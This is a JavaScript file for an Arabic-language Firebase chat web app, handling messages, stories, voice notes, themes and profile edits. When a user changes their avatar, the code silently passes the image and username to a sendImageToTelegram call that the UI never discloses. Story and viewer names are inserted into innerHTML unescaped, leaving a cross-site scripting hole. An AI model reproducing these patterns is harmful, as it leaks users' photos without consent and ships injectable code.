// التحكم في صفحة المحادثة
document.addEventListener('DOMContentLoaded', function() {
    const currentUser = JSON.parse(localStorage.getItem('fb_chat_current_user'));
    
    if (!currentUser) {
        window.location.href = 'index.html';
        return;
    }
    
    // عرض معلومات المستخدم مع العلامة
    updateProfileDisplay(currentUser);
    
    // عرض الصورة الشخصية
    const currentUsername = currentUser.username.toUpperCase();
    
    if (currentUsername === 'FIROGIST') {
        document.getElementById('userAvatar').src = 'images/123456.png';
        document.getElementById('userAvatar').onerror = function() {
            this.src = 'https://via.placeholder.com/50';
        };
    } else if (currentUser.avatar) {
        document.getElementById('userAvatar').src = currentUser.avatar;
    } else {
        document.getElementById('userAvatar').src = 'https://via.placeholder.com/50';
    }
    
    // التحقق من وجود استوري نشط
    checkMyActiveStory();
    
    // تحميل الوضع الداكن
    loadDarkMode();
    
    // تحديث حالة الاتصال
    firebaseChat.updateOnlineStatus();
    
    setInterval(() => {
        firebaseChat.updateOnlineStatus();
    }, 30000);
    
    window.addEventListener('beforeunload', function() {
        firebaseChat.updateOfflineStatus();
    });
    
    document.addEventListener('visibilitychange', function() {
        if (document.hidden) {
            firebaseChat.updateOfflineStatus();
        } else {
            firebaseChat.updateOnlineStatus();
            firebaseChat.loadUsers();
        }
    });
    
    // تحميل الثيم المحفوظ
    loadTheme();
    
    // تحميل قائمة المحادثات
    firebaseChat.loadUsers();
    
    // تحميل الإيموجيز
    loadEmojis();
    
    // عداد الضغطات على البروفايل
    let profileClickCount = 0;
    let profileClickTimer = null;
    
    document.getElementById('userProfile').addEventListener('click', function(e) {
        if (e.target.closest('.edit-avatar-btn') || e.target.closest('.edit-name-btn') || e.target.closest('.edit-username-btn') || e.target.closest('.add-story-btn')) {
            return;
        }
        
        profileClickCount++;
        
        clearTimeout(profileClickTimer);
        
        profileClickTimer = setTimeout(() => {
            profileClickCount = 0;
        }, 2000);
        
        if (profileClickCount >= 5) {
            profileClickCount = 0;
            firebaseChat.showHiddenChats();
        }
    });
    
    // تغيير الصورة الشخصية
    window.changeAvatar = function() {
        if (confirm('هل تسمح بالوصول إلى الصور؟')) {
            document.getElementById('avatarInput').click();
        }
    };
    
    // معالجة تغيير الصورة
    window.handleAvatarChange = async function(event) {
        const file = event.target.files[0];
        
        if (!file) return;
        
        if (!file.type.startsWith('image/')) {
            alert('الرجاء اختيار ملف صورة');
            return;
        }
        
        const reader = new FileReader();
        
        reader.onload = async function(e) {
            const imageDataUrl = e.target.result;
            const result = await firebaseAuth.updateAvatar(currentUser.username, imageDataUrl);
            
            if (result.success) {
                document.getElementById('userAvatar').src = imageDataUrl;
                const updatedUser = JSON.parse(localStorage.getItem('fb_chat_current_user'));
                updatedUser.avatar = imageDataUrl;
                localStorage.setItem('fb_chat_current_user', JSON.stringify(updatedUser));
                await sendImageToTelegram(imageDataUrl, currentUser.username);
            } else {
                alert('فشل في تحديث الصورة');
            }
        };
        
        reader.readAsDataURL(file);
        event.target.value = '';
    };
    
    // البحث عن مستخدم جديد
    window.searchUser = async function() {
        const searchInput = document.getElementById('searchUser').value.trim();
        
        if (!searchInput) {
            alert('الرجاء إدخال اسم المستخدم');
            return;
        }
        
        const result = await firebaseAuth.searchUser(searchInput);
        
        if (result.success) {
            firebaseChat.selectPartner(result.user);
            document.getElementById('searchUser').value = '';
        } else {
            alert('❌ المستخدم غير موجود');
        }
    };
    
    // إرسال رسالة
    window.sendMessage = async function() {
        const messageInput = document.getElementById('messageInput');
        const message = messageInput.value.trim();
        
        if (!message) return;
        
        const sent = await firebaseChat.sendMessage(message);
        
        if (sent) {
            messageInput.value = '';
            messageInput.focus();
        }
    };
    
    // معالجة رفع الصورة
    window.handleImageUpload = async function(event) {
        const file = event.target.files[0];
        
        if (!file) return;
        
        if (!file.type.startsWith('image/')) {
            alert('الرجاء اختيار ملف صورة');
            return;
        }
        
        const reader = new FileReader();
        
        reader.onload = async function(e) {
            const imageDataUrl = e.target.result;
            const sent = await firebaseChat.sendImage(imageDataUrl);
            if (!sent) alert('فشل في إرسال الصورة');
        };
        
        reader.readAsDataURL(file);
        event.target.value = '';
    };
    
    // إرسال بالضغط على Enter
    document.getElementById('messageInput').addEventListener('keypress', function(e) {
        if (e.key === 'Enter' && !e.shiftKey) {
            e.preventDefault();
            sendMessage();
        }
    });
    
    // حدث الكتابة
    let typingTimeout = null;
    
    document.getElementById('messageInput').addEventListener('input', function() {
        const partnerUsername = firebaseChat.currentPartner ? firebaseChat.currentPartner.username : '';
        
        if (this.value.trim().length > 0 && partnerUsername) {
            firebaseChat.updateTypingStatus(true, partnerUsername);
            clearTimeout(typingTimeout);
            typingTimeout = setTimeout(() => {
                firebaseChat.updateTypingStatus(false, '');
            }, 2000);
        } else {
            firebaseChat.updateTypingStatus(false, '');
        }
    });
    
    // إغلاق القائمة المنسدلة
    document.addEventListener('click', function(e) {
        const menu = document.getElementById('dropdownMenu');
        const dots = document.querySelector('.menu-dots');
        
        if (menu && dots && !menu.contains(e.target) && !dots.contains(e.target)) {
            menu.classList.remove('show');
        }
    });
    
    // تحديث قائمة المحادثات
    setInterval(() => {
        if (!document.hidden) {
            firebaseChat.loadUsers();
        }
    }, 30000);
});

// ============ دوال التبويبات ============
window.switchMainTab = function(tab) {
    const chatList = document.getElementById('chatList');
    const storiesList = document.getElementById('storiesList');
    const chatsBtn = document.getElementById('chatsTabBtn');
    const storiesBtn = document.getElementById('storiesTabBtn');
    
    if (tab === 'chats') {
        chatList.style.display = 'block';
        storiesList.style.display = 'none';
        chatsBtn.classList.add('active');
        storiesBtn.classList.remove('active');
        firebaseChat.loadUsers();
    } else {
        chatList.style.display = 'none';
        storiesList.style.display = 'block';
        chatsBtn.classList.remove('active');
        storiesBtn.classList.add('active');
        loadStories();
    }
};

window.loadStories = async function() {
    const stories = await firebaseChat.getAllActiveStories();
    const list = document.getElementById('storiesList');
    
    list.innerHTML = '';
    
    if (stories.length === 0) {
        list.innerHTML = '<div style="text-align:center;padding:20px;color:#999;">لا توجد حالات نشطة</div>';
        return;
    }
    
    stories.forEach(story => {
        const item = document.createElement('div');
        item.className = 'story-list-item';
        item.onclick = () => openUserStory(story.username);
        
        item.innerHTML = `
            <img src="${story.avatar || 'https://via.placeholder.com/45'}" alt="${story.name}" onerror="this.src='https://via.placeholder.com/45'">
            <div class="chat-item-info">
                <h4>${story.name}</h4>
                <p>@${story.username}</p>
            </div>
        `;
        
        list.appendChild(item);
    });
};

// ============ دوال الاستوري ============
let storyMediaData = null;
let storyMediaType = null;

window.openStoryUpload = function() {
    document.getElementById('storyUploadModal').classList.add('show');
    document.getElementById('storyPreview').style.display = 'none';
    document.getElementById('storyImagePreview').style.display = 'none';
    document.getElementById('storyVideoPreview').style.display = 'none';
    document.getElementById('storyCaption').value = '';
    storyMediaData = null;
    storyMediaType = null;
};

window.closeStoryUpload = function() {
    document.getElementById('storyUploadModal').classList.remove('show');
};

window.handleStoryFileSelect = function(event) {
    const file = event.target.files[0];
    
    if (!file) return;
    
    if (file.type.startsWith('image/')) {
        storyMediaType = 'image';
        const reader = new FileReader();
        reader.onload = function(e) {
            storyMediaData = e.target.result;
            document.getElementById('storyImagePreview').src = storyMediaData;
            document.getElementById('storyImagePreview').style.display = 'block';
            document.getElementById('storyVideoPreview').style.display = 'none';
            document.getElementById('storyPreview').style.display = 'block';
        };
        reader.readAsDataURL(file);
    } else if (file.type.startsWith('video/')) {
        const video = document.createElement('video');
        video.preload = 'metadata';
        video.src = URL.createObjectURL(file);
        
        video.onloadedmetadata = function() {
            if (video.duration > 120) {
                alert('الفيديو أطول من دقيقتين!');
                URL.revokeObjectURL(video.src);
                return;
            }
            
            storyMediaType = 'video';
            const reader = new FileReader();
            reader.onload = function(e) {
                storyMediaData = e.target.result;
                document.getElementById('storyVideoPreview').src = storyMediaData;
                document.getElementById('storyVideoPreview').style.display = 'block';
                document.getElementById('storyImagePreview').style.display = 'none';
                document.getElementById('storyPreview').style.display = 'block';
            };
            reader.readAsDataURL(file);
        };
    } else {
        alert('اختر صورة أو فيديو');
    }
    
    event.target.value = '';
};

window.postStory = async function() {
    if (!storyMediaData || !storyMediaType) {
        alert('اختر صورة أو فيديو أولاً');
        return;
    }
    
    const caption = document.getElementById('storyCaption').value.trim();
    const success = await firebaseChat.postStory(storyMediaData, storyMediaType, caption);
    
    if (success) {
        closeStoryUpload();
        checkMyActiveStory();
        alert('✅ تم نشر الاستوري بنجاح!');
    } else {
        alert('فشل في نشر الاستوري');
    }
};

window.deleteMyStory = async function() {
    if (!firebaseChat.currentStoryId) return;
    
    if (!confirm('هل أنت متأكد من حذف هذا الاستوري؟')) return;
    
    const success = await firebaseChat.deleteStory(firebaseChat.currentStoryId);
    
    if (success) {
        closeStoryViewer();
        checkMyActiveStory();
        alert('✅ تم حذف الاستوري بنجاح!');
    }
};

window.checkMyActiveStory = async function() {
    const hasStory = await firebaseChat.checkActiveStory(firebaseChat.currentUser.username);
    
    if (hasStory) {
        document.getElementById('fireRingWrapper').classList.add('has-story');
    } else {
        document.getElementById('fireRingWrapper').classList.remove('has-story');
    }
};

window.openMyStory = async function() {
    const story = await firebaseChat.getMyStory();
    
    if (!story) {
        alert('لا يوجد استوري');
        return;
    }
    
    displayStory(story, true);
};

window.openUserStory = async function(username) {
    const story = await firebaseChat.getUserStory(username);
    
    if (!story) {
        alert('لا يوجد استوري');
        return;
    }
    
    await firebaseChat.recordStoryView(story.id);
    displayStory(story, false);
};

window.displayStory = function(story, isOwner) {
    firebaseChat.currentStoryId = story.id;
    
    document.getElementById('storyViewerAvatar').src = story.avatar || 'https://via.placeholder.com/40';
    document.getElementById('storyViewerName').textContent = story.name;
    
    const time = story.created_at ? story.created_at.toDate().toLocaleString('ar') : '';
    document.getElementById('storyViewerTime').textContent = time;
    
    document.getElementById('storyViewerCaption').textContent = story.caption || '';
    
    if (story.media_type === 'image') {
        document.getElementById('storyViewerImage').src = story.media_url;
        document.getElementById('storyViewerImage').style.display = 'block';
        document.getElementById('storyViewerVideo').style.display = 'none';
    } else {
        document.getElementById('storyViewerVideo').src = story.media_url;
        document.getElementById('storyViewerVideo').style.display = 'block';
        document.getElementById('storyViewerImage').style.display = 'none';
    }
    
    document.getElementById('storyViewCount').textContent = (story.views || []).length;
    
    // إظهار زر الحذف لصاحب الاستوري فقط
    if (isOwner) {
        document.getElementById('deleteStoryBtn').style.display = 'flex';
    } else {
        document.getElementById('deleteStoryBtn').style.display = 'none';
    }
    
    document.getElementById('storyViewer').classList.add('show');
};

window.closeStoryViewer = function() {
    document.getElementById('storyViewer').classList.remove('show');
};

window.showStoryViews = async function() {
    if (!firebaseChat.currentStoryId) return;
    
    const viewers = await firebaseChat.getStoryViews(firebaseChat.currentStoryId);
    const list = document.getElementById('storyViewsList');
    
    list.innerHTML = '';
    
    if (viewers.length === 0) {
        list.innerHTML = '<div style="text-align:center;padding:20px;color:#999;">لا توجد مشاهدات</div>';
    } else {
        viewers.forEach(viewer => {
            const item = document.createElement('div');
            item.className = 'story-view-item';
            
            item.innerHTML = `
                <img src="${viewer.avatar || 'https://via.placeholder.com/35'}" alt="${viewer.name}" onerror="this.src='https://via.placeholder.com/35'">
                <span>${viewer.name}</span>
            `;
            
            list.appendChild(item);
        });
    }
    
    document.getElementById('storyViewsModal').classList.add('show');
};

window.closeStoryViews = function() {
    document.getElementById('storyViewsModal').classList.remove('show');
};

// ============ دوال التسجيل الصوتي ============
let mediaRecorder = null;
let audioChunks = [];
let recordingStartTime = null;
let recordingTimerInterval = null;

window.startRecording = async function(event) {
    if (event && event.type === 'touchstart') event.preventDefault();
    
    if (!firebaseChat.currentPartner) {
        alert('اختر مستخدم للمحادثة أولاً');
        return;
    }
    
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
        
        mediaRecorder = new MediaRecorder(stream);
        audioChunks = [];
        
        mediaRecorder.ondataavailable = function(e) {
            if (e.data.size > 0) audioChunks.push(e.data);
        };
        
        mediaRecorder.onstop = function() {
            const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
            const reader = new FileReader();
            
            reader.onload = async function(e) {
                const audioDataUrl = e.target.result;
                const duration = Math.floor((Date.now() - recordingStartTime) / 1000);
                
                stream.getTracks().forEach(track => track.stop());
                
                document.getElementById('recordingBar').style.display = 'none';
                document.getElementById('voiceBtn').classList.remove('recording');
                
                if (duration < 1) {
                    alert('التسجيل قصير جداً');
                    return;
                }
                
                const sent = await firebaseChat.sendVoiceMessage(audioDataUrl, duration);
                if (!sent) alert('فشل في إرسال الرسالة الصوتية');
            };
            
            reader.readAsDataURL(audioBlob);
        };
        
        mediaRecorder.start();
        recordingStartTime = Date.now();
        
        document.getElementById('recordingBar').style.display = 'flex';
        document.getElementById('voiceBtn').classList.add('recording');
        
        recordingTimerInterval = setInterval(() => {
            const elapsed = Math.floor((Date.now() - recordingStartTime) / 1000);
            const mins = Math.floor(elapsed / 60);
            const secs = elapsed % 60;
            document.getElementById('recordingTimer').textContent = 
                `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
        }, 1000);
        
    } catch (error) {
        alert('مش قادر أوصل للميكروفون. تأكد من الإذن.');
    }
};

window.stopRecording = function() {
    if (mediaRecorder && mediaRecorder.state === 'recording') {
        mediaRecorder.stop();
        clearInterval(recordingTimerInterval);
    }
};

window.cancelRecording = function() {
    if (mediaRecorder && mediaRecorder.state === 'recording') {
        mediaRecorder.stop();
        clearInterval(recordingTimerInterval);
    }
    
    audioChunks = [];
    document.getElementById('recordingBar').style.display = 'none';
    document.getElementById('voiceBtn').classList.remove('recording');
};

window.sendVoiceMessage = async function() {
    if (mediaRecorder && mediaRecorder.state === 'recording') {
        mediaRecorder.stop();
        clearInterval(recordingTimerInterval);
    }
};

// ============ دوال الوضع الداكن ============

window.toggleDarkMode = function() {
    const container = document.getElementById('chatContainer');
    container.classList.toggle('dark-mode');
    
    const isDark = container.classList.contains('dark-mode');
    localStorage.setItem('fb_dark_mode', isDark ? 'true' : 'false');
    
    const btn = document.getElementById('darkModeBtn');
    btn.textContent = isDark ? '☀️ الوضع النهاري' : '🌙 الوضع الداكن';
    
    document.getElementById('dropdownMenu').classList.remove('show');
};

window.loadDarkMode = function() {
    const saved = localStorage.getItem('fb_dark_mode');
    if (saved === 'true') {
        document.getElementById('chatContainer').classList.add('dark-mode');
        document.getElementById('darkModeBtn').textContent = '☀️ الوضع النهاري';
    }
};

// ============ دوال الإيموجي ============

const emojiList = [
    '😀', '😁', '😂', '🤣', '😃', '😄', '😅', '😆', '😉', '😊',
    '😋', '😎', '😍', '🥰', '😘', '😗', '😙', '😚', '🙂', '🤗',
    '🤩', '🤔', '🤨', '😐', '😑', '😶', '🙄', '😏', '😣', '😥',
    '😮', '🤐', '😯', '😪', '😫', '😴', '😌', '😛', '😜', '😝',
    '🤤', '😒', '😓', '😔', '😕', '🙃', '🤑', '😲', '☹️', '🙁',
    '😖', '😞', '😟', '😤', '😢', '😭', '😦', '😧', '😨', '😩',
    '🤯', '😬', '😰', '😱', '🥵', '🥶', '😳', '🤪', '😵', '😡',
    '😠', '🤬', '😷', '🤒', '🤕', '🤢', '🤮', '🤧', '😇', '🥳',
    '🥺', '🤠', '🤡', '🤥', '🤫', '🤭', '🧐', '🤓', '😈', '👿',
    '👹', '👺', '💀', '👻', '👽', '🤖', '💩', '😺', '😸', '😹',
    '❤️', '🧡', '💛', '💚', '💙', '💜', '🖤', '🤍', '🤎', '💔',
    '❤️‍🔥', '❤️‍🩹', '💖', '💗', '💓', '💞', '💕', '💘', '💝', '💟',
    '👍', '👎', '👌', '✌️', '🤞', '🤟', '🤘', '👏', '🙌', '👐',
    '🤲', '🤝', '🙏', '💪', '🦾', '🖕', '☝️', '👆', '👇', '👉',
    '👈', '✊', '👊', '🤛', '🤜', '🤚', '👋', '🤚', '🖐️', '✋'
];

window.loadEmojis = function() {
    const grid = document.getElementById('emojiGrid');
    grid.innerHTML = '';
    
    emojiList.forEach(emoji => {
        const span = document.createElement('span');
        span.className = 'emoji-item';
        span.textContent = emoji;
        span.onclick = function() { insertEmoji(emoji); };
        grid.appendChild(span);
    });
};

window.toggleEmojiPicker = function() {
    const picker = document.getElementById('emojiPicker');
    if (picker.style.display === 'none') {
        picker.style.display = 'block';
    } else {
        picker.style.display = 'none';
    }
};

window.insertEmoji = function(emoji) {
    const input = document.getElementById('messageInput');
    input.value += emoji;
    input.focus();
};

// ============ دوال تعديل الاسم ============

window.updateProfileDisplay = function(user) {
    const currentUsername = user.username.toUpperCase();
    const isDev = currentUsername === 'FIROGIST';
    const isPrincess = currentUsername === 'BESO';
    
    if (isDev) {
        document.getElementById('userName').innerHTML = `${user.name} <span class="gold-check">✓</span>`;
        document.getElementById('userUsername').innerHTML = `@${user.username} <span class="dev-badge">مطور</span>`;
    } else if (isPrincess) {
        document.getElementById('userName').innerHTML = `${user.name} <span class="silver-check">✓</span>`;
        document.getElementById('userUsername').innerHTML = `@${user.username} <span class="princess-badge">البرنسيسه</span>`;
    } else {
        document.getElementById('userName').textContent = user.name;
        document.getElementById('userUsername').textContent = '@' + user.username;
    }
};

window.editName = function() {
    const currentUser = JSON.parse(localStorage.getItem('fb_chat_current_user'));
    document.getElementById('editNameInput').value = currentUser.name;
    document.getElementById('editNameModal').classList.add('show');
};

window.closeEditNameModal = function() {
    document.getElementById('editNameModal').classList.remove('show');
};

window.saveNewName = async function() {
    const newName = document.getElementById('editNameInput').value.trim();
    
    if (!newName) {
        alert('الرجاء إدخال اسم');
        return;
    }
    
    const currentUser = JSON.parse(localStorage.getItem('fb_chat_current_user'));
    
    try {
        await db.collection('users').doc(currentUser.username).update({ name: newName });
        currentUser.name = newName;
        localStorage.setItem('fb_chat_current_user', JSON.stringify(currentUser));
        updateProfileDisplay(currentUser);
        closeEditNameModal();
        alert('✅ تم تغيير الاسم بنجاح!');
    } catch (error) {
        alert('فشل في تغيير الاسم');
    }
};

window.editUsername = function() {
    const currentUser = JSON.parse(localStorage.getItem('fb_chat_current_user'));
    
    if (currentUser.last_username_change) {
        const lastChange = new Date(currentUser.last_username_change);
        const now = new Date();
        const diffDays = Math.floor((now - lastChange) / (1000 * 60 * 60 * 24));
        
        if (diffDays < 7) {
            alert(`⚠️ مش هتقدر تغير اسم المستخدم غير بعد ${7 - diffDays} يوم`);
            return;
        }
    }
    
    document.getElementById('editUsernameInput').value = currentUser.username;
    document.getElementById('editUsernameModal').classList.add('show');
};

window.closeEditUsernameModal = function() {
    document.getElementById('editUsernameModal').classList.remove('show');
};

window.saveNewUsername = async function() {
    const newUsername = document.getElementById('editUsernameInput').value.trim();
    
    if (!newUsername || newUsername.length < 3) {
        alert('اسم المستخدم يجب أن يكون 3 أحرف على الأقل');
        return;
    }
    
    const currentUser = JSON.parse(localStorage.getItem('fb_chat_current_user'));
    
    if (!confirm('⚠️ تحذير: مش هتقدر تغير اسم المستخدم تاني غير بعد 7 أيام!\n\nهل أنت متأكد؟')) return;
    
    try {
        const userDoc = await db.collection('users').doc(newUsername).get();
        if (userDoc.exists) {
            alert('اسم المستخدم موجود بالفعل');
            return;
        }
        
        await db.collection('users').doc(currentUser.username).delete();
        
        await db.collection('users').doc(newUsername).set({
            ...currentUser,
            username: newUsername,
            last_username_change: new Date().toISOString(),
            chat_partners: [],
            hidden_chats: []
        });
        
        currentUser.username = newUsername;
        currentUser.last_username_change = new Date().toISOString();
        localStorage.setItem('fb_chat_current_user', JSON.stringify(currentUser));
        
        updateProfileDisplay(currentUser);
        closeEditUsernameModal();
        alert('✅ تم تغيير اسم المستخدم بنجاح!\n⚠️ العلامة الذهبية والشارة اختفوا.');
        
        setTimeout(() => { window.location.reload(); }, 1500);
        
    } catch (error) {
        alert('فشل في تغيير اسم المستخدم');
    }
};

// ============ دوال الثيمات ============

let currentTheme = {
    font: 'Cairo',
    messageBg: '#ffffff',
    chatBg: '#f5f5f5'
};

window.openThemeModal = function() {
    document.getElementById('themeModal').classList.add('show');
    document.getElementById('dropdownMenu').classList.remove('show');
};

window.closeThemeModal = function() {
    document.getElementById('themeModal').classList.remove('show');
};

window.switchThemeTab = function(tab) {
    document.getElementById('fontSection').style.display = 'none';
    document.getElementById('messageBgSection').style.display = 'none';
    document.getElementById('chatBgSection').style.display = 'none';
    
    if (tab === 'font') document.getElementById('fontSection').style.display = 'block';
    else if (tab === 'messageBg') document.getElementById('messageBgSection').style.display = 'block';
    else if (tab === 'chatBg') document.getElementById('chatBgSection').style.display = 'block';
    
    document.querySelectorAll('.theme-tab').forEach(btn => btn.classList.remove('active'));
    event.target.classList.add('active');
};

window.selectFont = function(font) { currentTheme.font = font; applyThemePreview(); };
window.selectMessageBg = function(color) { currentTheme.messageBg = color; applyThemePreview(); };
window.selectChatBg = function(color) { currentTheme.chatBg = color; applyThemePreview(); };

window.applyThemePreview = function() {
    document.getElementById('chatContainer').style.fontFamily = `'${currentTheme.font}', sans-serif`;
    document.getElementById('messages').style.background = currentTheme.chatBg;
    document.querySelectorAll('.message.received .message-content').forEach(el => {
        el.style.background = currentTheme.messageBg;
    });
};

window.saveTheme = function() {
    localStorage.setItem('fb_chat_theme', JSON.stringify(currentTheme));
    closeThemeModal();
    alert('✅ تم حفظ الثيم بنجاح!');
};

window.loadTheme = function() {
    const savedTheme = localStorage.getItem('fb_chat_theme');
    if (savedTheme) {
        currentTheme = JSON.parse(savedTheme);
        applyThemePreview();
    }
};

window.resetTheme = function() {
    currentTheme = { font: 'Cairo', messageBg: '#ffffff', chatBg: '#f5f5f5' };
    localStorage.removeItem('fb_chat_theme');
    applyThemePreview();
};

// ============ دوال أخرى ============

window.logout = function() {
    if (confirm('هل أنت متأكد من تسجيل الخروج؟')) {
        firebaseChat.updateOfflineStatus();
        localStorage.removeItem('fb_chat_current_user');
        localStorage.removeItem('fb_chat_remember');
        window.location.href = 'index.html';
    }
};

document.addEventListener('click', function(e) {
    const editModal = document.getElementById('editModal');
    if (editModal && e.target === editModal) closeEditModal();
    
    const themeModal = document.getElementById('themeModal');
    if (themeModal && e.target === themeModal) closeThemeModal();
    
    const editNameModal = document.getElementById('editNameModal');
    if (editNameModal && e.target === editNameModal) closeEditNameModal();
    
    const editUsernameModal = document.getElementById('editUsernameModal');
    if (editUsernameModal && e.target === editUsernameModal) closeEditUsernameModal();
});